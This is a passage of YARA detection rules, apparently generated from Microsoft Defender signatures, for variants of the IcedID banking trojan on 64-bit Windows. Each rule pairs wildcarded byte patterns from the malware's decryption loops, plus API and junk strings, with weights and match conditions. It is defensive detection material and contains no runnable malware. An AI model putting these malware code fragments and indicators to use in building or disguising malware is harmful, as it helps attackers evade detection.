        $x_1_6 = "ping" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EF_2147839912_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EF!MTB"
        threat_id = "2147839912"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 f7 ec c1 fa ?? 8b c2 c1 e8 ?? 03 c2 48 98 48 8d 0c c0 49 63 c4 41 83 c4 01 48 8d 14 88 48 8b 44 24 ?? 42 0f b6 8c 32 ?? ?? ?? ?? 41 32 4c 00 ff 43 88 4c 18 ff}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NEAC_2147840319_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NEAC!MTB"
        threat_id = "2147840319"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {4c 03 c8 49 63 c4 41 83 c4 01 4c 03 c8 48 8b 44 24 28 4c 03 cb 43 0f b6 8c 31 ?? ?? ?? ?? 32 4c 07 ff 88 4c 37 ff 44 3b 64 24 20}  //weight: 10, accuracy: Low
        $x_1_2 = "VirtualProtect" ascii //weight: 1
        $x_1_3 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_CP_2147840479_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.CP!MTB"
        threat_id = "2147840479"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {48 8b 54 24 20 88 04 0a eb ?? ?? ?? 39 04 24 ?? ?? 48 63 04 24 eb ?? ?? ?? ?? ?? ?? 89 04 24 8b 44 24 28 ?? ?? 8b c1 48 63 0c 24 ?? ?? 48 8b 4c 24 30 0f b6 04 01}  //weight: 5, accuracy: Low
        $x_5_2 = {89 54 24 10 48 89 4c 24 08 ?? ?? 44 89 4c 24 20 4c 89 44 24 18 ?? ?? 8b 4c 24 04 33 c8 ?? ?? 89 44 24 04 8b 04 24 ?? ?? 8b c2 48 98 ?? ?? 48 8b 4c 24 20}  //weight: 5, accuracy: Low
        $x_5_3 = {0f b6 04 01 ?? ?? 99 f7 7c 24 38 ?? ?? 48 83 ec 18 c7}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NEAD_2147840578_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NEAD!MTB"
        threat_id = "2147840578"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "17"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "Cpurtyhvlc" ascii //weight: 5
        $x_5_2 = "PuDZpvv" ascii //weight: 5
        $x_5_3 = "WFIiulT22" ascii //weight: 5
        $x_1_4 = "VirtualAlloc" ascii //weight: 1
        $x_1_5 = "IsDebuggerPresent" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GEH_2147840632_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GEH!MTB"
        threat_id = "2147840632"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {8b c1 ff c1 99 41 f7 f8 33 d2 41 88 44 b4 04 0f b6 87 ?? ?? ?? ?? 66 01 05 ?? ?? ?? ?? 48 63 05 ?? ?? ?? ?? 49 f7 74 f5 00 25 ?? ?? ?? ?? 41 09 03 41 0f b6 41 ?? 99 41 f7 fa 66 31 05 ?? ?? ?? ?? 0f b7 45 00 0f b6 14 87 3b ca 75}  //weight: 10, accuracy: Low
        $x_1_2 = "Cpurtyhvlc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ZA_2147840928_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ZA!MTB"
        threat_id = "2147840928"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b c6 c1 e2 ?? 2b c2 41 ?? ?? ?? 41 ?? ?? 41 ?? ?? ?? 03 c8 48 ?? ?? ?? ?? 03 cb ff c3 48 ?? ?? 42 ?? ?? ?? ?? ?? ?? ?? ?? 41 ?? ?? ?? ?? 41 ?? ?? ?? ?? 3b 5c 24 ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ZA_2147840928_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ZA!MTB"
        threat_id = "2147840928"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {66 89 44 24 ?? b8 5a 00 00 00 e9 ?? ?? ?? ?? b8 02 00 00 00 83 c0 74 66 3b e4 74 ?? 66 89 44 24 6a b8 44 00 00 00 66 3b f6 74 ?? 66 89 44 24 6e b8 5f 00 00 00 66 3b c0 74}  //weight: 1, accuracy: Low
        $x_1_2 = "castfdasudhyugawujdbyau" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ZB_2147841289_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ZB!MTB"
        threat_id = "2147841289"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {f7 e9 d1 fa 8b c2 c1 e8 ?? 03 d0 8d 04 92 3b c8 74 05 01 7d ?? eb ?? ff 4d ?? 8b 4d ?? 41 ?? ?? f7 e9 8b c2 c1 e8 ?? 03 d0 8d 04 52 3b c8 74}  //weight: 1, accuracy: Low
        $x_1_2 = "DllMain" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ZB_2147841289_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ZB!MTB"
        threat_id = "2147841289"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "castfdasudhyugawujdbyau" ascii //weight: 1
        $x_1_2 = "sendBeacon&&Ib.sendBeacon" ascii //weight: 1
        $x_1_3 = "if(0===a.indexOf(\"https://\"))return 2;if(0===a.indexOf(\"http://\"))return 3}return 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GFJ_2147841843_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GFJ!MTB"
        threat_id = "2147841843"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {f7 eb 8b cb 03 d3 ff c3 c1 fa 05 8b c2 c1 e8 1f 03 d0 6b c2 3a 2b c8 48 8b 44 24 28 48 63 d1 42 0f b6 0c 12 41 32 4c 00 ff 43 88 4c 08 ff 3b 5c 24 20 72 c3}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ZC_2147841847_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ZC!MTB"
        threat_id = "2147841847"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {88 08 48 8b ?? ?? 48 ?? ?? 3a db 74 ?? 48 ?? ?? ?? 48 ?? ?? ?? ?? 48 ?? ?? 66 ?? ?? 74}  //weight: 1, accuracy: Low
        $x_1_2 = {33 c8 8b c1 e9 ?? ?? ?? ?? 33 d2 48 ?? ?? b9 ?? ?? ?? ?? 3a c0 74}  //weight: 1, accuracy: Low
        $x_1_3 = "init" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_YD_2147842219_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.YD!MTB"
        threat_id = "2147842219"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {02 02 43 32 04 31 41 ?? ?? ?? 49 ?? ?? 8b 02 d3 c8 ff c0 89 02 83 e0 ?? 0f b6 c8 41 ?? ?? d3 c8 ff c0 41 ?? ?? 48 ?? ?? ?? ?? 4c ?? ?? ?? ?? 73}  //weight: 1, accuracy: Low
        $x_1_2 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_WK_2147842878_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.WK!MTB"
        threat_id = "2147842878"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {33 d2 48 8b c1 b9 04 00 00 00 48 f7 f1 48 8b c2 0f b6 44 04 7c 8b 4c 24 64 33 c8 8b c1 48 63 4c 24 40 88 84 0c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_YE_2147842906_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.YE!MTB"
        threat_id = "2147842906"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4c 8b 84 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? 33 c0 48 ?? ?? ?? ?? ?? ?? 5f e9 ?? ?? ?? ?? 8b 84 24 ?? ?? ?? ?? 39 44 24 ?? 73 ?? 48 ?? ?? ?? ?? e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? 88 04 0a e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? e9 ?? ?? ?? ?? ff c0 89 44 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GHC_2147843732_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GHC!MTB"
        threat_id = "2147843732"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Cyw269" ascii //weight: 1
        $x_1_2 = "Httu992oI3" ascii //weight: 1
        $x_1_3 = "KHo6" ascii //weight: 1
        $x_1_4 = "SYdgyu816qBG" ascii //weight: 1
        $x_1_5 = "VXbar774" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_CE_2147843750_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.CE!MTB"
        threat_id = "2147843750"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "eanish_ISO_8859_1_create_env" ascii //weight: 1
        $x_1_2 = "eg_magic_func" ascii //weight: 1
        $x_1_3 = "IYRgEVQmEFhSMQXSMouJ" ascii //weight: 1
        $x_1_4 = "KYSsJnLXNznsORULrToeSVE" ascii //weight: 1
        $x_1_5 = "eanish_ISO_8859_1_stem" ascii //weight: 1
        $x_1_6 = "erench_UTF_8_create_env" ascii //weight: 1
        $x_1_7 = "eut_grouping_b_U" ascii //weight: 1
        $x_1_8 = "eg_finfo_dsnowball_init" ascii //weight: 1
        $x_1_9 = "ewedish_ISO_8859_1_stem" ascii //weight: 1
        $x_1_10 = "ewedish_UTF_8_stem" ascii //weight: 1
        $x_1_11 = "LAbogJzPLksUQcWX" ascii //weight: 1
        $x_1_12 = "eind_among_b" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MMA_2147844440_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MMA!MTB"
        threat_id = "2147844440"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 d2 49 89 44 c9 ?? 48 8b 05 ?? ?? ?? ?? 0f b6 0d ?? ?? ?? ?? 48 83 c0 ?? 48 c1 e0 ?? 48 89 0c 18 41 0f b6 03 49 81 34 c1 ?? ?? ?? ?? 48 8b 05 ?? ?? ?? ?? 48 35 ?? ?? ?? ?? 49 f7 34 f9 49 89 04 f9 42 0f b7 44 6d ?? 44 3b c0}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GUS_2147844657_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GUS!MTB"
        threat_id = "2147844657"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 01 c8 44 29 d0 41 01 c0 48 8d 05 ?? ?? ?? ?? 41 29 c8 41 29 c8 45 01 c8 4d 63 c0 42 8a 04 00 32 04 32 88 04 37 e9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MIL_2147845115_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MIL!MTB"
        threat_id = "2147845115"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {66 ff c0 66 89 44 24 ?? 0f b7 44 24 ?? 8b 4c 24 ?? 83 c1 ?? 48 63 c9 48 8b 94 24 ?? ?? ?? ?? 8b 0c 8a 0f af c8 8b c1 48 98 48 89 84 24 ?? ?? ?? ?? 8b 84 24 ?? ?? ?? ?? 89 44 24 ?? 48 63 44 24 ?? b9 ?? ?? ?? ?? 48 69 c9 ?? ?? ?? ?? 48 8b 15 ?? ?? ?? ?? 48 33 04 0a 66 89 44 24 ?? 44 0f b7 4c 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GHU_2147845682_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GHU!MTB"
        threat_id = "2147845682"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Fgd42a" ascii //weight: 1
        $x_1_2 = "JOFLT5N" ascii //weight: 1
        $x_1_3 = "QbVpma208csJ" ascii //weight: 1
        $x_1_4 = "StartMNE" ascii //weight: 1
        $x_1_5 = "wgyufoy" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MKV_2147846003_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MKV!MTB"
        threat_id = "2147846003"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4d 63 c2 4d 8d 5b ?? 48 8b c7 41 ff c2 49 f7 e0 48 d1 ea 48 6b ca ?? 4c 2b c1 42 0f b6 44 84 ?? 41 30 43 ?? 41 81 fa ?? ?? ?? ?? 72}  //weight: 1, accuracy: Low
        $x_1_2 = {4d 63 c1 48 8d 49 ?? 48 8b c7 41 ff c1 49 f7 e0 48 d1 ea 48 6b c2 ?? 4c 2b c0 42 0f b6 44 84 ?? 30 41 ?? 41 81 f9 ?? ?? ?? ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_MKR_2147846005_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MKR!MTB"
        threat_id = "2147846005"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 63 c8 4d 8d 52 ?? 48 8b c3 41 ff c0 48 f7 e1 48 c1 ea ?? 48 8d 04 92 48 03 c0 48 2b c8 0f b6 44 8c ?? 41 30 42 ?? 41 81 f8 ?? ?? ?? ?? 72}  //weight: 1, accuracy: Low
        $x_1_2 = {49 63 c9 4d 8d 40 ?? 48 8b c3 41 ff c1 48 f7 e1 48 c1 ea ?? 48 8d 04 92 48 03 c0 48 2b c8 0f b6 44 8c ?? 41 30 40 ?? 41 81 f9 ?? ?? ?? ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_AAD_2147846223_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AAD!MTB"
        threat_id = "2147846223"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {ff c0 89 44 24 ?? 8b 84 24 ?? ?? ?? ?? 39 44 24 ?? 73 ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? 0f b6 04 01 89 44 24 ?? 8b 44 24 ?? 99 b9 ?? ?? ?? ?? f7 f9 8b c2 48 ?? 48 ?? ?? ?? ?? ?? ?? 0f be 04 01 8b 4c 24 ?? 33 c8 8b c1}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AAE_2147846224_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AAE!MTB"
        threat_id = "2147846224"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {66 3b e4 74 ?? b9 ?? ?? ?? ?? 48 ?? ?? e9 ?? ?? ?? ?? 48 ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? 66 ?? ?? 74 ?? b9 ?? ?? ?? ?? f3 ?? e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? 0f b6 84 04 ?? ?? ?? ?? 3a f6 74 ?? ff c0 89 44 24 ?? e9 ?? ?? ?? ?? 8b 00 89 84 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? 8b 4c 24 ?? 33 c8 3a c9 74 ?? 8b d0}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ADD_2147846287_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ADD!MTB"
        threat_id = "2147846287"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 04 24 eb ?? 8b 4c 24 ?? 33 c8 eb ?? 83 84 24 ?? ?? ?? ?? ?? c7 04 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? 0f b6 04 01 eb ?? 99 f7 bc 24 ?? ?? ?? ?? eb ?? 83 44 24 ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? eb ?? 8b c2 48 ?? eb ?? 48}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ADA_2147846288_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ADA!MTB"
        threat_id = "2147846288"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 84 04 ?? ?? ?? ?? 3a f6 74 ?? ff c0 89 44 24 ?? e9 ?? ?? ?? ?? 8b 00 89 84 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? 8b 4c 24 ?? 33 c8 3a c9 74 ?? 8b d0 48 ?? ?? ?? ?? 3a c0 74 ?? 8b c1 48 ?? ?? ?? ?? 3a f6 74 ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? e9 ?? ?? ?? ?? e9 ?? ?? ?? ?? 48 ?? ?? 48}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_PBF_2147846475_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.PBF!MTB"
        threat_id = "2147846475"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {03 c8 48 8b 83 ?? ?? ?? ?? 31 4b ?? 41 8b d0 48 63 8b ?? ?? ?? ?? c1 ea 10 88 14 01 41 8b d0 ff 83 ?? ?? ?? ?? 48 63 8b ?? ?? ?? ?? 48 8b 83 ?? ?? ?? ?? c1 ea 08 88 14 01 ff 83 ?? ?? ?? ?? 8b 43 70}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_CAFW_2147846542_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.CAFW!MTB"
        threat_id = "2147846542"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 63 44 24 50 48 8d ?? ?? ?? ?? ?? 0f b6 04 01 89 84 24 90 00 00 00 8b 44 24 50 99 b9 ?? ?? ?? ?? f7 f9 8b c2 48 98 48 8d ?? ?? ?? ?? ?? 0f be 04 01 8b 8c 24 90 00 00 00 33 c8 8b c1 48 63 4c 24 50 48 8b 54 24 68 88 04 0a eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ADB_2147846664_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ADB!MTB"
        threat_id = "2147846664"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c7 49 f7 e0 41 ff c2 48 2b ca 48 d1 e9 48 03 ca 48 c1 e9 ?? 48 6b c1 ?? 4c 2b c0 42 ?? ?? ?? ?? ?? 41 30 43 ?? 41}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b c7 41 ff c1 48 f7 e1 48 8b c1 48 2b c2 48 d1 e8 48 03 c2 48 c1 e8 ?? 48 6b c0 ?? 48 2b c8 0f b6 84 8c ?? ?? ?? ?? 41 30 40 ?? 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MMJ_2147846810_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MMJ!MTB"
        threat_id = "2147846810"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 01 d0 44 0f b6 00 8b 85 ?? ?? ?? ?? 89 c2 c1 fa ?? c1 ea ?? 01 d0 83 e0 ?? 29 d0 48 98 48 03 85 ?? ?? ?? ?? 0f b6 00 44 31 c0 88 01 83 85 ?? ?? ?? ?? ?? 8b 95 ?? ?? ?? ?? 8b 85 ?? ?? ?? ?? 39 c2 0f 92 c0 84 c0 75}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ADC_2147846829_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ADC!MTB"
        threat_id = "2147846829"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b 4c 24 ?? 0f be 04 01 85 c0 74 ?? 8b 44 24 ?? 48 ?? ?? ?? ?? 0f b7 04 01 66 89 04 24 8b 44 24 ?? ff c0 89 44 24 ?? 0f b7 04 24 8b 4c 24 ?? c1 e9 ?? 8b 54 24 ?? c1 e2 ?? 0b ca 03 c1 8b 4c 24 ?? 33 c8 8b c1 89 44 24 ?? eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ADE_2147846920_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ADE!MTB"
        threat_id = "2147846920"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
